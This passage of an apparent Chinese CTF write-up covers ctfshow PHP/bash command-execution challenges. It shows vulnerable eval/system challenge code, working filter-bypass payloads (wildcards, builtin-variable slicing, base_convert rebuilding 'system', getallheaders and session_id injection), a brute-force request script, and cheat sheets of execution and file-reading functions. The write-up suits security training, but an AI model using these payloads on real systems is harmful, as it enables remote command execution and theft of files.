class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>继续学习bash内置变量的trick</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$&#123;#&#125;为添加到shell的参数个数，$&#123;##&#125;则为值 空输出的话就是1<br>我们这次因为能用到的内置变量就是 $PWD -&gt; /var/www/html<br>所以这次构造取反读取命令 rev<br>$&#123;#IFS&#125;在ubuntu等系统中值为3<br>所以/bin/rev为<br>$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???<br></code></pre></td></tr></table></figure>
</li>
<li><p>fuzz</p>
<p>PWD、#、也被ban了，但是HOME没有被禁</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="hljs-variable">$code</span>))&#123;    <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">65</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-string">&#x27;you are so long , I dont like &#x27;</span>.<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这次我们换另一个命令<code>/bin/base64</code></p>
<p>对于/的截取，这里引入$?内置变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$? 最后运行的命令的结束代码（返回值）即执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)<br>&quot;OS error code   1:  Operation not permitted&quot;<br>&quot;OS error code   2:  No such file or directory&quot;<br>&quot;OS error code   3:  No such process&quot;<br>&quot;OS error code   4:  Interrupted system call&quot;<br>&quot;OS error code   5:  Input/output error&quot;<br>&quot;OS error code   6:  No such device or address&quot;<br>&quot;OS error code   7:  Argument list too long&quot;<br>&quot;OS error code   8:  Exec format error&quot;<br>&quot;OS error code   9:  Bad file descriptor&quot;<br>&quot;OS error code  10:  No child processes&quot;<br></code></pre></td></tr></table></figure>
<p>输入<code>&lt;A</code>即可返回状态码1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 于是截取/可以通过<br>- $&#123;HOME::$?&#125;<br>// 接着利用通配符匹配bin 和 base<br>- $&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;????<br>// 对于数字64，根据题目的提示fuzz,可以采用$&#123;RANDOM&#125;爆破出64来<br>// 当然直接爆破出数字64几率很小，但是爆破出开头为4的数字还是可以的<br>&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???<br></code></pre></td></tr></table></figure>
<p>我傻了，最后结果应该是base64编码，怎么可能会出现ctfshow。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://7b9783ec-5114-4084-b863-8d1ff2a7f333.challenge.ctf.show/&quot;</span><br>payload = <span class="hljs-string">r&quot;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: payload <br>&#125;<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = requests.post(url, data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;PD9waHA&quot;</span> <span class="hljs-keyword">in</span> r.text: 												<span class="hljs-comment"># &lt;?php</span><br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(r.status_code)<br></code></pre></td></tr></table></figure>
</li>
<li><p>RCE</p>
<p>题面如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: 收集自网络</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-06 14:04:45</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;  <span class="hljs-comment">// /m可以匹配&#x27;\n&#x27;</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <span class="hljs-comment">// 结果排序为$matches[0]保存完整模式的所有匹配, $matches[1] 保存第一个子组的所有匹配</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>限制一：长度不超过80；</p>
<p>限制二：黑名单<code>&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;</code>‘, ‘\[‘, ‘\]‘</p>
<p>限制三：白名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];<br></code></pre></td></tr></table></figure>
<p>我们需要充分利用白名单中的函数来构造出我们想用的函数。用法有两种：1. 可以当作变量名 2. 可以用作中间转换函数</p>
<p>这里用到了<code>base_convert</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">任意进制之间转换数字<br>base_convert(number,frombase,tobase)<br>返回一个字符串，包含 number 以 tobase 进制的表示。number 本身的进制由 frombase 指定。frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。<br></code></pre></td></tr></table></figure>
<p>重点在于，高于十进制的数字用字母a-z表示，那么我们是否可以借此来搞一些命令执行函数出来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">system 最大字母排在24 也就是我们可以选择一个&gt;25进制作为frombase<br>比如 base_convert(&quot;system&quot;, 36, 10) =&gt; 1751504350<br>那么 base_convert(1751504350, 10, 36) =&gt; system 并且可以绕过引号的过滤<br>接下来利用php函数名可以作为函数的特性<br>c=$ip=base_convert,$ip(1751504350, 10, 36)     // echo 之间可以通过逗号连接<br></code></pre></td></tr></table></figure>
</li>
</ol>
<p>接下来就是考虑system参数如何传的问题，我们在这里可以通过两种方式：通过文件头传入命令参数，而文件头信息的获取去搭配getallheaders()，回传一个数组。数组的索引采取键值对的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">首先是构造getallheaders关键词<br>base_convert(8768397090111664438, 10, 30)<br>然后就是组合<br>c=$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)  //小心空格<br>1作为文件头参数传入命令执行语句，同时绕过白名单<br>ctfshow&#123;7764f3d0-696a-47e0-976b-8545d04e9c73&#125;<br></code></pre></td></tr></table></figure>
<p>或者通过GET/POST传参方式，在参数点需要构造一个$_GET[]，不过还要涉及多个进制转换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">构造 $_GET[a]($_GET[b])  =&gt; a=system&amp;b=ls<br>在线进制转换：https://tool.lu/hexconvert/<br>hex2bin的10进制为37907361743<br>dechex的作用是十进制转换为十六进制<br>_GET转16进制再转10进制的值为1598506324<br>hex2bin把十六进制的字符串转换为ASCII码 <br>用pi当变量的原因是pi在白名单中，变量名只要在白名单中都可以，后面的sin和cos也是一样的<br>=&gt; hex2bin(dechex(1598506324)) =&gt; _GET<br>=&gt; $pi=_GET $$pi&#123;sin&#125; =&gt; $_GET&#123;sin&#125;($_GET[cos])<br>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;sin&#125;($$pi&#123;cos&#125;)&amp;sin=system&amp;cos=tac flag.php<br></code></pre></td></tr></table></figure>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li><p>绕过空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$&#123;IFS&#125; 但不能写作 $IFS<br>$IFS$9<br>%09<br>&lt;&gt;<br>&lt;<br>$IFS%09<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">system : 执行外部程序，并且显示输出，如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。<br>exec ： 执行一个外部程序,回显最后一行,需要用echo输出。<br>shell_exec ： 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。<br>popen ： 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。<br>proc_open ： 执行一个命令，并且打开用来输入/输出的文件指针。<br>passthru ： 执行外部程序并且显示原始输出。同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。<br>pcntl_exec() ： 在当前进程空间执行指定程序，当发生错误时返回 false ，没有错误时没有返回。 <br>`（反引号）：同 shell_exec() <br><br>可回显 system passthru echo配合<br></code></pre></td></tr></table></figure>
</li>
<li><p>同cat的查看文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">more:一页一页的显示档案内容<br>less:与 more 类似 head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看 <br>file -f:报错出具体内容<br>strings: find the printable strings in a object, or other binary, file<br></code></pre></td></tr></table></figure>
</li>
<li><p>遍历目录的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">getallheaders()：返回所有的HTTP头信息，返回的是数组而eval要求为字符串，所以要用implode()函数将数组转换为字符串<br><br>get_defined_vars()：该函数的作用是获取所有的已定义变量，返回值也是数组，不过是二维数组，用var_dump()输出可以看见输出的内容，看见在第几位之后，可以用current()函数来获取其值，详细可以看官方函数。<br>payload：var_dump(current(get_defined_vars()));<br><br>session_id()：session_id()可以用来获取/设置当前会话 ID，可以用这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。<br>    如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后用hex2bin()函数，<br>    即传入?exp=eval(hex2bin(session_id(session_start())));     <br>    并设置cookie：PHPSESSID=706870696e666f28293b<br>    session_start 函数是为了开启session<br>    <br>配合使用的函数：<br>	print_r(scandir(‘.’)); 查看当前目录下的所有文件名<br>  var_dump()<br>	localeconv() 函数返回一包含本地数字及货币格式信息的数组。<br>	current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名<br>	each() 返回数组中当前的键/值对并将数组指针向前移动一步<br>	end() 将数组的内部指针指向最后一个单元<br>	next() 将数组中的内部指针向前移动一位<br>	prev() 将数组中的内部指针倒回一位<br>	array_reverse() 以相反的元素顺序返回数组<br></code></pre></td></tr></table></figure>
</li>
<li><p>输入输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">2&gt;/dev/null   把错误输出到空设备（即丢弃）<br>&gt;/dev/null 2&gt;&amp;1   相当于1&gt;/dev/null 2&gt;&amp;1   即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备<br>2&gt;&amp;1 &gt;/dev/null   错误输出到标准输出，即输出到屏幕上，而标准输出被丢弃<br><br>something interesting: 重定向&gt; 和 &gt;&gt;   前者会先清空文件，然后再写入内容，后者会将重定向的内容追加到现有文件的尾部.<br></code></pre></td></tr></table></figure>
</li>
<li><p>shell中的整数运算$(())</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$(()) 代表做一次运算，因为里面为空，也表示值为0<br>$((~$(()))) 对0作取反运算，值为-1<br>$(($((~$(())))$((~$(()))))) -1-1，也就是(-1)+(-1)为-2，所以值为-2<br>$((~$(($((~$(())))$((~$(()))))))) 再对-2做一次取反得到1，所以值为1<br><br>如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1<br></code></pre></td></tr></table></figure>
</li>
<li><p>PHP读取文件的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">常用读文件函数<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">php_strip_whitespace</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br><br><span class="hljs-comment">// file — 把整个文件读入一个数组中</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$filename</span>)); <br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$filename</span>));<br><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><span class="hljs-keyword">include_once</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><span class="hljs-keyword">require</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><br><span class="hljs-comment">// fopen去读取文件内容</span><br><span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;r&quot;</span>), <span class="hljs-variable">$size</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&quot;cat flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>), <span class="hljs-variable">$size</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;r&quot;</span>))); <span class="hljs-comment">// 读取一行</span><br><span class="hljs-title function_ invoke__">fpassthru</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;r&quot;</span>)); <span 